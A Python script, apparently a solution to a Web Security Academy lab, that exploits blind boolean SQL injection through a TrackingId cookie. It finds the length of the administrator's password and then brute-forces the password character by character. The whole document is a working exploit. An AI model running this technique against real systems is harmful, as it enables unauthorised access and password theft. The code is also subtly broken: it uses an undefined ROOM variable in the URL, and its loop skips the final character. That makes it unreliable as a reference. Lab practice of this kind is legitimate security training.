import requests

ROOM_ID = ''

url = f'https://{ROOM}.web-security-academy.net/'

pss = ''

alf = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

head = {
    'Cookie': ''
}

TID = ''
USERNAME = 'administrator'
FIND_KEY = 'Welcome back!'
TABLE = 'users'

def get_pass_length(nm=1):
    query = f"AND LENGTH((SELECT password FROM {TABLE} WHERE username='{USERNAME}')) = '{nm}"
    head['Cookie'] = f"TrackingId={TID}' {query}"
    a = requests.get(url=url, headers=head)
    if a.text.find(FIND_KEY) != -1:
        print(nm, a.text.find(FIND_KEY) != -1)
        return nm
    return get_pass_length(nm+1)

PASS_LEN = get_pass_length()

print('PASSWORD LEGNTH IS: ', PASS_LEN)

for nm in range(1, PASS_LEN):
    for x in alf:
        query = f"AND SUBSTRING((SELECT password FROM {TABLE} WHERE username='{USERNAME}'), 1, {nm}) = '{pss}{x}"
        head['Cookie'] = f"TrackingId={TID}' {query}"
        a = requests.get(url=url, headers=head)
        print('TRYING:', pss+x, ' ON LENGTH:', nm,' WORKED: ',a.text.find(FIND_KEY) != -1)
        if a.text.find(FIND_KEY) != -1:
            pss += x
            print('NEW WORD: ', pss)
            break
    if len(pss) < nm:
        cnt = input("Couldn't find the next character, Want to stop here? [Y/N]: ")
        if cnt == 'Y':
            exit()
print('FULL PASSWORD: ', pss)